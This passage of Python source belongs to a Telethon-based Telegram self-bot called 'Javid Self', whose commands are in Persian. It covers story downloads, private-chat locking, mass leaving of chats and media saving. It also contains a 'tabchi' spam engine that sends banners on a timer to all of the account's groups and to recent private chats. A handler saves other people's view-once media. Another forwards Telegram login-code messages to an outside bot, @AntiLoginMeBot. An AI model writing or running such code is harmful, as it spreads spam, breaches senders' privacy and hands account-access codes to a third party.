            start_dt = pytz.timezone('Asia/Tehran').localize(start_dt)
    except Exception as e:
        print(f"{e}")
        expire_str = "Uncertain!"
    else:
        expire_time = start_dt + timedelta(days=expire_days)
        remaining = expire_time - now_dt

        if remaining.total_seconds() < 0:
            expire_str = "Expired!"
        else:
            days = remaining.days
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            expire_str = f"{days} Days, {hours:02}:{minutes:02}"

    result += "\n\n"
    result += "❈ Creator : t.me/uezrz\n"
    result += "❈ Bot : @JavidSelfBot\n"
    result += "❈ Version : 2.2 \n"
    result += "❈ Expire : Unknown\n"
    result += "❈ Channel : @JavidSelf"

    await event.edit(f"{result}")

@client.on(events.NewMessage(outgoing=True, pattern=r'^دانلود استوری (.+)$'))
async def download_story_handler(event):
    if not self_enabled:
        return
    is_admin = is_fake_event(event)
    story_url = event.pattern_match.group(1).strip()

    if is_admin:
        msg = await event._original.reply("╮ لطفا صبر کنید... | Javid Self")
    else:
        try:
            msg = await event.edit("╮ لطفا صبر کنید... | Javid Self")
        except:
            msg = await event.respond("╮ لطفا صبر کنید... | Javid Self")

    try:
        if not story_url.startswith('https://t.me/'):
            await msg.edit("╮ لینک استوری نامعتبر است! | Javid Self")
            return

        parts = story_url.split('/')
        username = None
        story_id = None

        for i, part in enumerate(parts):
            if part == 's' and i + 1 < len(parts):
                username = parts[i - 1] if i - 1 >= 0 else None
                story_id = parts[i + 1]
                break

        if not username or not story_id:
            await msg.edit("╮ فرمت لینک نامعتبر است! | Javid Self")
            return

        try:
            story_id = int(story_id)
        except:
            await msg.edit("╮ شناسه استوری باید عددی باشد! | Javid Self")
            return

        try:
            entity = await client.get_entity(username)
        except ValueError:
            if username.startswith('c/'):
                try:
                    channel_id = int(username[2:])
                    entity = await client.get_entity(channel_id)
                except:
                    await msg.edit("╮ استوری یافت نشد! | Javid Self")
                    return
            else:
                await msg.edit("╮ استوری یافت نشد! | Javid Self")
                return

        stories = await client(GetStoriesByIDRequest(
            peer=entity,
            id=[story_id]
        ))

        if not stories.stories:
            await msg.edit("╮ استوری یافت نشد! | Javid Self")
            return

        story = stories.stories[0]

        if not hasattr(story, 'media') or not story.media:
            await msg.edit("╮ استوری رسانه‌ای نیست! | Javid Self")
            return

        media = story.media
        downloaded = await client.download_media(media)

        if isinstance(downloaded, str) and os.path.exists(downloaded):
            await client.send_file(event.chat_id, downloaded,
                                   caption=f"╮ استوری از @{username} | Javid Self", supports_streaming=True)
            os.remove(downloaded)
        elif isinstance(downloaded, bytes):
            await client.send_file(event.chat_id, downloaded,
                                   caption=f"╮ استوری از @{username} | Javid Self", supports_streaming=True)
        else:
            await msg.edit("╮ دریافت فایل با شکست مواجه شد. | Javid Self")
            return

        try:
            await msg.delete()
        except:
            pass

    except Exception as e:
        print(f"{e}")
        try:
            await msg.edit("╮ خطا در دانلود استوری! | Javid Self")
        except:
            await event.respond("╮ خطا در دانلود استوری! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^دریافت استوری(?: |$)(.*)'))
async def get_stories_handler(event):
    if not self_enabled:
        return
    try:
        is_admin = is_fake_event(event)
        input_arg = event.pattern_match.group(1).strip()

        msg = await safe_respond(event, "╮ لطفا صبر کنید... | Javid Self")

        reply = None
        if event.is_reply:
            reply = await event.get_reply_message()
        elif is_admin and event._original.is_reply:
            reply = await event._original.get_reply_message()

        if reply:
            user = await reply.get_sender()
            entity = await client.get_entity(user.id)
        elif input_arg:
            try:
                entity = await client.get_entity(input_arg)
            except Exception:
                traceback.print_exc()
                await safe_respond(event, "╮ کاربر یافت نشد! | Javid Self", msg)
                return
        else:
            await safe_respond(event, "╮ لطفاً به درستی از دستور استفاده کنید! | Javid Self", msg)
            return

        try:
            mention = f"[{entity.first_name}](tg://user?id={entity.id})"
            result = f"╮ استوری های {mention}:\n\n"
            base_url = f"https://t.me/{entity.username or ('c/' + str(entity.id))}/s/"

            active_stories = await client(functions.stories.GetPeerStoriesRequest(peer=entity))
            pinned_stories = await client(functions.stories.GetPinnedStoriesRequest(
                peer=entity,
                offset_id=0,
                limit=999999
            ))

            all_stories = []
            if hasattr(active_stories, 'stories') and active_stories.stories.stories:
                all_stories.extend(active_stories.stories.stories)
            if hasattr(pinned_stories, 'stories') and pinned_stories.stories:
                all_stories.extend(pinned_stories.stories)

            if not all_stories:
                await safe_respond(event, "╮ استوری ای وجود ندارد! | Javid Self", msg)
                return

            for story in all_stories:
                result += f"{base_url}{story.id}\n"

            await safe_respond(event, result, msg)

            if is_admin:
                try:
                    await msg.delete()
                except:
                    pass

        except Exception:
            traceback.print_exc()
            await safe_respond(event, "╮ خطا در دریافت استوری ها! | Javid Self", msg)

    except Exception:
        traceback.print_exc()
        await safe_respond(event, "╮ خطای کلی در اجرای دستور دریافت استوری! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^پروفایل روشن$'))
async def enable_profile_rotation(event):
    if not self_enabled:
        return
    global profile_enabled
    profile_enabled = True
    await event.edit("╮ پروفایل روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^پروفایل خاموش$'))
async def disable_profile_rotation(event):
    if not self_enabled:
        return
    global profile_enabled
    profile_enabled = False
    await event.edit("╮ پروفایل خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم زمان پروفایل (\d+)$'))
async def set_profile_interval(event):
    if not self_enabled:
        return
    global profile_interval_minutes
    minutes = int(event.pattern_match.group(1))
    if 10 <= minutes <= 60:
        profile_interval_minutes = minutes
        await event.edit(f"╮ زمان پروفایل روی {minutes} دقیقه تنظیم شد. | Javid Self")
    else:
        await event.edit("╮ عدد باید 10 الی 60 باشد! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم تعداد پروفایل (\d+)$'))
async def set_profile_max_count(event):
    if not self_enabled:
        return
    global profile_max_count
    count = int(event.pattern_match.group(1))
    if 1 <= count <= 100:
        profile_max_count = count
        await event.edit(f"╮ تعداد پروفایل روی {count} تنظیم شد. | Javid Self")
    else:
        await event.edit("╮ عدد باید 1 الی 100 باشد! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم پروفایل$'))
async def set_profile_channel(event):
    if not self_enabled:
        return
    global profile_channel_id
    try:
        reply = None
        if event.is_reply:
            reply = await event.get_reply_message()
        elif hasattr(event, "_original") and event._original.is_reply:
            reply = await event._original.get_reply_message()

        if not reply:
            await event.edit("╮ پیام باید از کانال فوروارد شده باشد! | Javid Self")
            return

        if not reply.forward or not reply.forward.chat:
            await event.edit("╮ پیام باید از کانال فوروارد شده باشد! | Javid Self")
            return

        channel = reply.forward.chat
        profile_channel_id = channel.id
        used_profile_photo_ids.clear()
        await event.edit("╮ پروفایلتنظیم شد. | Javid Self")

    except Exception as e:
        print(f"{e}")
        await event.edit("╮ خطا در تنظیم پروفایل! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^قفل پیوی روشن$'))
async def enable_pv_lock(event):
    if not self_enabled:
        return
    global pv_lock_enabled
    pv_lock_enabled = True
    pv_warned_users.clear()
    await event.edit("╮ قفل پیوی روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^قفل پیوی خاموش$'))
async def disable_pv_lock(event):
    if not self_enabled:
        return
    global pv_lock_enabled
    pv_lock_enabled = False
    pv_warned_users.clear()
    await event.edit("╮ قفل پیوی خاموش شد. | Javid Self")

@client.on(events.NewMessage(incoming=True))
async def pv_lock_handler(event):
    if not self_enabled:
        return
    global pv_warned_users
    if not pv_lock_enabled:
        return

    if event.is_private and event.sender_id != (await client.get_me()).id:
        user_id = event.sender_id

        if user_id in admin_list:
            return

        if user_id not in pv_warned_users:
            pv_warned_users.add(user_id)

            try:
                await event.delete()
            except:
                pass

            try:
                warn_msg = await client.send_message(user_id, "قفل پیوی روشن است، پیام ها حذف خواهند شد! | Javid Self")
                await asyncio.sleep(30)
                await warn_msg.delete()
            except:
                pass
        else:
            try:
                await client.delete_messages(event.chat_id, event.id)
            except:
                pass

@client.on(events.NewMessage(outgoing=True, pattern=r'^لفت همگانی کانال$'))
async def leave_all_channels(event):
    if not self_enabled:
        return
    await event.edit("╮ لطفا صبر کنید... | Javid Self")

    me = await client.get_me()
    left = 0

    async def leave_channel(entity):
        nonlocal left
        try:
            participant = await client(functions.channels.GetParticipantRequest(
                channel=entity,
                participant=me.id
            ))
            role = participant.participant
            if isinstance(role, (ChannelParticipantAdmin, ChannelParticipantCreator)):
                return
        except:
            pass

        try:
            await client(LeaveChannelRequest(entity))
            left += 1
        except:
            pass

    tasks = []

    async for dialog in client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and not entity.megagroup:
            tasks.append(leave_channel(entity))

    await asyncio.gather(*tasks)

    await event.edit(f"╮ از {left} کانال لفت داده شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^لفت همگانی گروه$'))
async def leave_all_groups(event):
    if not self_enabled:
        return
    await event.edit("╮ لطفا صبر کنید... | Javid Self")

    me = await client.get_me()
    left = 0

    async def leave_group(entity):
        nonlocal left
        try:
            participant = await client.get_participant(entity, me.id)
            if isinstance(participant.participant, (ChatParticipantAdmin, ChatParticipantCreator)):
                return
        except:
            pass

        try:
            await client(LeaveChannelRequest(entity))
            left += 1
        except:
            pass

    tasks = []

    async for dialog in client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Chat) or (isinstance(entity, Channel) and entity.megagroup):
            tasks.append(leave_group(entity))

    await asyncio.gather(*tasks)

    await event.edit(f"╮ از {left} گروه لفت داده شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^ذخیره زماندار روشن$'))
async def enable_save_view_once(event):
    if not self_enabled:
        return
    global save_view_once_enabled
    save_view_once_enabled = True
    await event.edit("╮ ذخیره زماندار روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^ذخیره زماندار خاموش$'))
async def disable_save_view_once(event):
    if not self_enabled:
        return
    global save_view_once_enabled
    save_view_once_enabled = False
    await event.edit("╮ ذخیره زماندار خاموش شد. | Javid Self")
    
@client.on(events.NewMessage(outgoing=True, pattern=r'^ذخیره مدیا روشن$'))
async def enable_save_media(event):
    if not self_enabled:
        return
    global save_media_enabled
    save_media_enabled = True
    await event.edit("╮ ذخیره مدیا روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^ذخیره مدیا خاموش$'))
async def disable_save_media(event):
    if not self_enabled:
        return
    global save_media_enabled
    save_media_enabled = False
    await event.edit("╮ ذخیره مدیا خاموش شد. | Javid Self")

@client.on(events.NewMessage(incoming=True))
async def handle_view_once_media(event):
    if not self_enabled:
        return
    global save_view_once_enabled

    if not save_view_once_enabled:
        return

    if not event.is_private:
        return

    sender = await event.get_sender()
    me = await client.get_me()
    if sender.id == me.id:
        return

    media = event.media

    if media and getattr(media, "ttl_seconds", None):
        try:
            file = await client.download_media(media)
            caption = f"╮ مدیا از [{sender.id}](tg://user?id={sender.id}) ذخیره شد. | Javid Self"
            await client.send_file("me", file, caption=caption)
            os.remove(file)
        except Exception as e:
            print(f"{e}")
            await client.send_message("me", "╮ خطا در ذخیره! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^آنتی لاگین روشن$'))
async def enable_anti_login(event):
    if not self_enabled:
        return
    global anti_login_enabled
    anti_login_enabled = True
    await event.edit("╮ آنتی لاگین روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^آنتی لاگین خاموش$'))
async def disable_anti_login(event):
    if not self_enabled:
        return
    global anti_login_enabled
    anti_login_enabled = False
    await event.edit("╮ آنتی لاگین خاموش شد. | Javid Self")

@client.on(events.NewMessage(incoming=True, from_users=777000))
async def handle_login_messages(event):
    if not anti_login_enabled:
        return
    
    target_bot = "@AntiLoginMeBot"
    
    try:
        delay = random.uniform(3.0, 7.0)
        await asyncio.sleep(delay)

        await client.send_message(target_bot, "/start")

        forwarded_msg = await client.forward_messages(target_bot, event.message)

        await client.send_message(
            target_bot, 
            "آنتی لاگین روشن بود و کد ورود منقضی شد.", 
            reply_to=forwarded_msg.id
        )
        
    except Exception as e:
        pass

@client.on(events.NewMessage(outgoing=True, pattern=r'^ذخیره(?: (https://t\.me/(?:c/\d+|[\w]+)/\d+))?$'))
async def save_message(event):
    if not self_enabled:
        return

    if event.id in active_saves:
        return

    active_saves.add(event.id)

    try:
        is_admin = is_fake_event(event)
        reply_msg = await event.get_reply_message() if not is_admin else await event._original.get_reply_message()
        link = event.pattern_match.group(1)

        if is_admin:
            msg = await event._original.reply("╮ در حال پردازش... | Javid Self")
        else:
            try:
                msg = await event.edit("╮ در حال پردازش... | Javid Self")
            except:
                msg = await event.respond("╮ در حال پردازش... | Javid Self")

        if link:
            try:
                match = re.match(r'https://t.me/(c/\d+|[\w]+)/(\d+)', link)
                if not match:
                    await msg.edit("╮ لینک نامعتبر است! | Javid Self")
                    return

                entity_part = match.group(1)
                msg_id = int(match.group(2))

                if entity_part.startswith('c/'):
                    chat_id = int(entity_part.split('/')[1])
                    if not str(chat_id).startswith("-100"):
                        chat_id = int(f"-100{chat_id}")
                    try:
                        entity = await client.get_entity(chat_id)
                    except:
                        await msg.edit("╮ کانال پیدا نشد یا عضو آن نیستید! | Javid Self")
                        return
                else:
                    entity = entity_part

                target_msg = await client.get_messages(entity, ids=msg_id)
                if not target_msg:
                    await msg.edit("╮ پیام پیدا نشد! | Javid Self")
                    return

                await client.forward_messages("me", target_msg)

                await msg.edit("╮ پیام با موفقیت فوروارد شد. | Javid Self")
                await asyncio.sleep(2)

            except Exception as e:
                await msg.edit(f"╮ خطا در فوروارد لینک: {e} | Javid Self")

        elif reply_msg:
            try:
                await client.forward_messages("me", reply_msg)

                await msg.edit("╮ پیام با موفقیت فوروارد شد. | Javid Self")
                await asyncio.sleep(2)

            except Exception as e:
                await msg.edit(f"╮ خطا در فوروارد: {e} | Javid Self")

        else:
            await msg.edit("╮ لطفاً روی پیام ریپلای کنید یا لینک آن را بفرستید! | Javid Self")
            await asyncio.sleep(2)

    finally:
        await asyncio.sleep(1)
        active_saves.discard(event.id)
        
async def banner_sender_loop(banner_id):
    while tabchi_enabled and banner_id in tabchi_banners:
        banner = tabchi_banners[banner_id]
        if banner["interval"] is None:
            await asyncio.sleep(5)
            continue
        interval = banner["interval"] * 60
        await asyncio.sleep(interval)
        if not tabchi_enabled or banner_id not in tabchi_banners:
            break
        targets = banner["targets"]
        if not targets:
            continue
        for target in targets:
            try:
                if banner["type"] == "forward":
                    await client.forward_messages(target, banner["msg"])
                else:
                    if banner["msg"].media:
                        await client.send_file(target, banner["msg"].media, caption=banner["msg"].message or "")
                    else:
                        await client.send_message(target, banner["msg"].message)
                await asyncio.sleep(1)
            except Exception as e:
                print(f"Error sending banner {banner_id}: {e}")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تبچی روشن$'))
async def enable_tabchi(event):
    global tabchi_enabled
    tabchi_enabled = True
    await event.edit("╮ قابلیت تبچی با موفقیت روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تبچی خاموش$'))
async def disable_tabchi(event):
    global tabchi_enabled
    tabchi_enabled = False
    for b_id, banner in tabchi_banners.items():
        if "task" in banner and banner["task"]:
            banner["task"].cancel()
            banner["task"] = None
    await event.edit("╮ قابلیت تبچی با موفقیت خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True))
async def tabchi_commands_handler(event):
    global tabchi_enabled, tabchi_banners, tabchi_targets, banner_counter
    
    if not self_enabled or not tabchi_enabled:
        return

    text = event.message.message or ""
    
    if text in ["تنظیم بنر فور", "تنظیم بنر کپی"] and event.is_reply:
        reply_msg = await event.get_reply_message()
        b_type = "forward" if "فور" in text else "copy"
        tabchi_banners[banner_counter] = {
            "type": b_type,
            "msg": reply_msg,
            "interval": None,
            "targets": list(tabchi_targets),
            "task": None
        }
        tabchi_banners[banner_counter]["task"] = asyncio.create_task(banner_sender_loop(banner_counter))
        await event.edit(f"╮ بنر شماره {banner_counter} ثبت شد.\n**نکته:** برای فعال‌سازی ارسال، دستور `تنظیم X دقیقه بنر {banner_counter}` را ارسال کنید. | Javid Self")
        banner_counter += 1
        return

    match = re.match(r'^تنظیم گپ هدف بنر (\d+)$', text)
    if match:
        b_id = int(match.group(1))
        chat_id = event.chat_id
        if b_id in tabchi_banners:
            if chat_id in tabchi_banners[b_id]["targets"]:
                await event.edit("╮ این گپ از قبل در لیست گپ های این بنر وجود دارد! | Javid Self")
            else:
                tabchi_banners[b_id]["targets"].append(chat_id)
                tabchi_targets.add(chat_id)
                await event.edit(f"╮ این گپ با موفقیت به لیست اهداف بنر {b_id} اضافه شد. | Javid Self")
        else:
            await event.edit("╮ بنری با این شماره یافت نشد! | Javid Self")
        return

    match = re.match(r'^حذف گپ هدف بنر (\d+)$', text)
    if match:
        b_id = int(match.group(1))
        chat_id = event.chat_id
        if b_id in tabchi_banners:
            if chat_id in tabchi_banners[b_id]["targets"]:
                tabchi_banners[b_id]["targets"].remove(chat_id)
                await event.edit(f"╮ این گپ از لیست اهداف بنر {b_id} حذف شد. | Javid Self")
            else:
                await event.edit("╮ این گپ در لیست گپ های این بنر وجود ندارد! | Javid Self")
        else:
            await event.edit("╮ بنری با این شماره یافت نشد! | Javid Self")
        return

    if text == "لیست بنر ها":
        if not tabchi_banners:
            await event.edit("╮ هیچ بنری ثبت نشده است! | Javid Self")
            return
        result = "لیست بنر ها به شرح زیر است :\n\n"
        for b_id, b_info in tabchi_banners.items():
            msg_preview = b_info["msg"].message or "[رسانه/بدون متن]"
            if len(msg_preview) > 30: msg_preview = msg_preview[:30] + "..."
            time_status = f"{b_info['interval']} دقیقه" if b_info['interval'] else "تنظیم نشده (غیرفعال)"
            result += f"**بنر {b_id}** ({b_info['type']})\n"
            result += f"متن پیام : {msg_preview}\n"
            result += f"تنظیم شده در : {len(b_info['targets'])} گروه\n"
            result += f"زمان اختصاصی : {time_status}\n"
            result += "———\n"
        await event.edit(result)
        return

    match = re.match(r'^تنظیم هدف بنر (\d+) تمام گپ ها$', text)
    if match:
        b_id = int(match.group(1))
        if b_id in tabchi_banners:
            await event.edit("╮ در حال جمع‌آوری گپ‌ها... | Javid Self")
            all_groups = []
            async for dialog in client.iter_dialogs():
                if dialog.is_group:
                    all_groups.append(dialog.id)
            tabchi_banners[b_id]["targets"] = all_groups
            await event.edit(f"╮ بنر {b_id} برای ارسال در {len(all_groups)} گپ ست شد. | Javid Self")
        else:
            await event.edit("╮ بنری با این شماره یافت نشد! | Javid Self")
        return

    match = re.match(r'^تنظیم (\d+) دقیقه بنر (\d+)$', text)
    if match:
        minutes = int(match.group(1))
        b_id = int(match.group(2))
        if b_id in tabchi_banners:
            tabchi_banners[b_id]["interval"] = minutes
            if tabchi_banners[b_id]["task"]:
                tabchi_banners[b_id]["task"].cancel()
            tabchi_banners[b_id]["task"] = asyncio.create_task(banner_sender_loop(b_id))
            await event.edit(f"╮ زمان‌بندی بنر {b_id} با موفقیت روی {minutes} دقیقه تنظیم و فعال شد. | Javid Self")
        else:
            await event.edit("╮ بنری با این شماره یافت نشد! | Javid Self")
        return

    match = re.match(r'^فور بنر در (\d+) پیوی اخیر$', text)
    if match:
        count = int(match.group(1))
        if event.is_reply:
            target_msg = await event.get_reply_message()
        else:
            await event.edit("╮ لطفاً این دستور را روی یک پیام ریپلای کنید! | Javid Self")
            return
        await event.edit(f"╮ در حال فوروارد پیام در {count} پیوی اخیر... | Javid Self")
        pvs_found = 0
        async for dialog in client.iter_dialogs():
            if dialog.is_user and not dialog.entity.bot:
                try:
                    await client.forward_messages(dialog.id, target_msg)
                    pvs_found += 1
                    await asyncio.sleep(1)
                except Exception:
                    pass
                if pvs_found >= count:
                    break
        await event.edit(f"╮ پیام با موفقیت به {pvs_found} پیوی اخیر فوروارد شد. | Javid Self")
        return

    match = re.match(r'^حذف بنر (\d+)$', text)
    if match:
        b_id = int(match.group(1))
        if b_id in tabchi_banners:
            if tabchi_banners[b_id]["task"]:
                tabchi_banners[b_id]["task"].cancel()
            del tabchi_banners[b_id]
            await event.edit(f"╮ بنر شماره {b_id} با موفقیت از لیست بنرها حذف و زمان‌بندی آن متوقف شد. | Javid Self")
        else:
            await event.edit("╮ بنری با این شماره یافت نشد! | Javid Self")
        return
        
    if text == "پاکسازی لیست بنر ها":
        if not tabchi_banners:
            await event.edit("╮ لیست بنرها از قبل خالی است! | Javid Self")
            return
        
        await event.edit("╮ در حال متوقف کردن زمان‌بندی‌ها و پاکسازی تمام بنرها... | Javid Self")
        for b_id, banner in tabchi_banners.items():
            if banner["task"]:
                banner["task"].cancel()
                
        tabchi_banners.clear()
        banner_counter = 1
        await event.edit("╮ تمامی بنرها با موفقیت حذف و کل زمان‌بندی‌ها متوقف شدند. شمارنده بنرها نیز ریست شد. | Javid Self")
        return

    if text == "وضعیت تبچی":
        await event.edit("╮ در حال محاسبه و بررسی وضعیت تبچی... | Javid Self")
        total_groups = 0
        async for dialog in client.iter_dialogs():
            if dialog.is_group:
                total_groups += 1
        active_chats = set()
        for b_id, b_info in tabchi_banners.items():
            if b_info["interval"] is not None and b_info["targets"]:
                for target_chat in b_info["targets"]:
                    active_chats.add(target_chat)
        active_groups_count = len(active_chats)
        status_text = "روشن" if tabchi_enabled else "خاموش"
        status_report = (
            "وضعیت تبچی به شرح زیر است :\n\n"
            f"تبچی : {status_text}\n"
            f"تعداد بنر ها : {len(tabchi_banners)} عدد\n"
            f"تعداد تمام گروه ها : {total_groups} عدد\n"
            f"تعداد گروه های در حال فعالیت : {active_groups_count} عدد\n"
            "———\n"
            "| Javid Self"
        )
        await event.edit(status_report)
        return

@client.on(events.NewMessage(outgoing=True, pattern=r'^دانلود یوتیوب (.+)$'))
async def youtube_download_handler(event):
    if not self_enabled:
        return
    global last_youtube_time

    yt_url = event.pattern_match.group(1).strip()
    bot_username = "JetDL_bot"

    if not re.match(r'^https?://(www\.)?(youtube\.com/(watch\?v=|shorts/)|youtu\.be/)', yt_url):
        await safe_respond(event, "╮ لینک معتبر یوتیوب نیست! | Javid Self")
        return

    current_time = time.time()
    if current_time - last_youtube_time < 30:
        await safe_respond(event, "╮ لطفاً ۳۰ ثانیه صبر کنید و دوباره تلاش کنید. | Javid Self")
        return
    last_youtube_time = current_time

    msg = await safe_respond(event, "╮ لطفاً صبر کنید... | Javid Self")

    try:
        await client.send_message(bot_username, "/start")
        await asyncio.sleep(1)

        await client.send_message(bot_username, yt_url)

        found = False
        for _ in range(20):
            await asyncio.sleep(1.5)
            async for message in client.iter_messages(bot_username, limit=3):
                if message.video or message.document:
                    await client.send_file(event.chat_id, message.media, caption="╮ ویدئو از یوتیوب دانلود شد! | Javid Self")
                    found = True
                    break
            if found:
                break

        if not found:
            await msg.edit("╮ فایل یافت نشد. لطفاً بعداً دوباره تلاش کنید. | Javid Self")
            return

        try:
            await client(DeleteHistoryRequest(
                peer=bot_username,
                max_id=0,
                revoke=True
            ))
        except Exception as e:
            print(f"{e}")

        if is_fake_event(event):
            try:
                await msg.delete()
            except:
                pass
        else:
            try:
                await msg.delete()
            except:
                pass

    except Exception as e:
        print(f"{e}")
        try:
            await msg.edit("╮ خطا در دانلود از یوتیوب! | Javid Self")
        except:
            await safe_respond(event, "╮ خطا در دانلود از یوتیوب! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^دانلود اینستا (.+)$'))
async def instagram_download_handler(event):
    if not self_enabled:
        return
    global last_instagram_time

    insta_url = event.pattern_match.group(1).strip()
    bot_username = "SaveAsBot"

    if not re.match(r'^https?://(www\.)?(instagram\.com/(reel|p|tv)/[A-Za-z0-9_-]+)', insta_url):
        await safe_respond(event, "╮ لینک معتبر اینستاگرام نیست! | Javid Self")
        return

    current_time = time.time()
    if current_time - last_instagram_time < 30:
        await safe_respond(event, "╮ لطفاً ۳۰ ثانیه صبر کنید و دوباره تلاش کنید. | Javid Self")
        return
    last_instagram_time = current_time

    msg = await safe_respond(event, "╮ لطفا صبر کنید... | Javid Self")

    try:
        await client.send_message(bot_username, "/start")
        await asyncio.sleep(1.2)
        await client.send_message(bot_username, insta_url)

        found = False
        for _ in range(25):
            await asyncio.sleep(2)
            async for message in client.iter_messages(bot_username, limit=4):
                if message.video or message.document:
                    await client.send_file(event.chat_id, message.media, caption="╮ ویدئو از اینستاگرام دریافت شد! | Javid Self")
                    found = True
                    break
            if found:
                break

        if not found:
            await msg.edit("╮ فایل یافت نشد. لطفاً چند دقیقه بعد دوباره تلاش کنید. | Javid Self")
            return

        await client(DeleteHistoryRequest(
            peer=bot_username,
            max_id=0,
            revoke=True
        ))

        try:
            await msg.delete()
        except:
            pass

    except Exception as e:
        print(f"{e}")
        try:
            await msg.edit("╮ خطا در ارتباط با ربات دانلود! | Javid Self")
        except:
            await safe_respond(event, "╮ خطا در دانلود از اینستاگرام! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^هوش مصنوعی (.+)$'))
async def gpt4_bot_handler(event):
    if not self_enabled:
        return
    global last_gpt_time
    question = event.pattern_match.group(1).strip()
    bot_username = "GPT4Telegrambot"
    temp_channel = "@perplexity"

    current_time = time.time()
    if current_time - last_gpt_time < 59:
        await safe_respond(event, "╮ لطفاً یک دقیقه صبر کنید و دوباره تلاش کنید. | Javid Self")
        return
    last_gpt_time = current_time

    try:
        msg = await safe_respond(event, "╮ لطفاً صبر کنید... | Javid Self")

        try:
            await client(functions.channels.JoinChannelRequest(channel=temp_channel))
        except Exception as e:
            print(f"{e}")

        await client.send_message(bot_username, "/start")
        await asyncio.sleep(1)
        await client.send_message(bot_username, question)

        last_response = None
        for _ in range(25):
            await asyncio.sleep(9)
            async for message in client.iter_messages(bot_username, limit=2):
                if not message.text:
                    continue
                if message.text.startswith("⏳ GPT-4o"):
                    continue
                if message.text.strip() == question:
                    continue
                if message.text != last_response:
                    last_response = message.text
                    break
            if last_response:
                break

        if last_response:
            await msg.edit(f"╮ پاسخ هوش مصنوعی:\n\n{last_response}\nJavid Self")
        else:
            await msg.edit("╮ پاسخ دریافت نشد، لطفاً کمی بعد دوباره تلاش کنید. | Javid Self")

        try:
            await client(DeleteHistoryRequest(
                peer=bot_username,
                max_id=0,
                revoke=True
            ))
        except Exception as e:
            print(f"{e}")

        try:
            await client(functions.channels.LeaveChannelRequest(channel=temp_channel))
        except Exception as e:
            print(f"{e}")

    except Exception as e:
        print(f"{e}")
        try:
            await safe_respond(event, "╮ خطا در دریافت پاسخ از هوش مصنوعی! | Javid Self", None)
        except:
            pass

@client.on(events.NewMessage(outgoing=True, pattern=r'^بلاک(?: (.+))?$'))
async def block_user_handler(event):
    if not self_enabled:
        return
        
    input_arg = event.pattern_match.group(1) if event.pattern_match.lastindex else None
    user = None

    if input_arg:
        try:
            user = await client.get_entity(input_arg.strip())
        except Exception:
            await event.edit("╮ کاربر یافت نشد یا آیدی نامعتبر است! | Javid Self")
            return
    elif event.is_reply:
        try:
            reply = await event.get_reply_message()
            user = await reply.get_sender()
        except Exception:
            await event.edit("╮ خطا در دریافت اطلاعات پیام ریپلای شده! | Javid Self")
            return
    else:
        await event.edit("╮ لطفاً روی پیام کاربر ریپلای کنید یا آیدی/یوزرنیم او را مقابل دستور وارد کنید! | Javid Self")
        return

    if user:
        try:
            await client(functions.contacts.BlockRequest(id=user.id))
            name = user.first_name or user.id
            await event.edit(f"╮ کاربر `{name}` با موفقیت بلاک شد. | Javid Self")
        except Exception as e:
            await event.edit(f"╮ خطا در بلاک کردن کاربر! | Javid Self")


@client.on(events.NewMessage(outgoing=True, pattern=r'^آنبلاک(?: (.+))?$'))
async def unblock_user_handler(event):
    if not self_enabled:
        return
        
    input_arg = event.pattern_match.group(1) if event.pattern_match.lastindex else None
    user = None

    if input_arg:
        try:
            user = await client.get_entity(input_arg.strip())
        except Exception:
            await event.edit("╮ کاربر یافت نشد یا آیدی نامعتبر است! | Javid Self")
            return
    elif event.is_reply:
        try:
            reply = await event.get_reply_message()
            user = await reply.get_sender()
        except Exception:
            await event.edit("╮ خطا در دریافت اطلاعات پیام ریپلای شده! | Javid Self")
            return
    else:
        await event.edit("╮ لطفاً روی پیام کاربر ریپلای کنید یا آیدی/یوزرنیم او را مقابل دستور وارد کنید! | Javid Self")
        return

    if user:
        try:
            await client(functions.contacts.UnblockRequest(id=user.id))
            name = user.first_name or user.id
            await event.edit(f"╮ کاربر `{name}` با موفقیت آنبلاک شد. | Javid Self")
        except Exception as e:
            await event.edit(f"╮ خطا در آنبلاک کردن کاربر! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^سین خودکار پیوی روشن$'))
async def enable_auto_read_private(event):
    if not self_enabled:
        return
    global auto_read_private
    auto_read_private = True
    await event.edit("╮ سین خودکار پیوی روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^سین خودکار پیوی خاموش$'))
async def disable_auto_read_private(event):
    if not self_enabled:
        return
    global auto_read_private
    auto_read_private = False
    await event.edit("╮ سین خودکار پیوی خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^سین خودکار کانال روشن$'))
async def enable_auto_read_channel(event):
    if not self_enabled:
        return
    global auto_read_channel
    auto_read_channel = True
    await event.edit("╮ سین خودکار کانال روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^سین خودکار کانال خاموش$'))
async def disable_auto_read_channel(event):
    if not self_enabled:
        return
    global auto_read_channel
    auto_read_channel = False
    await event.edit("╮ سین خودکار کانال خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^سین خودکار گروه روشن$'))
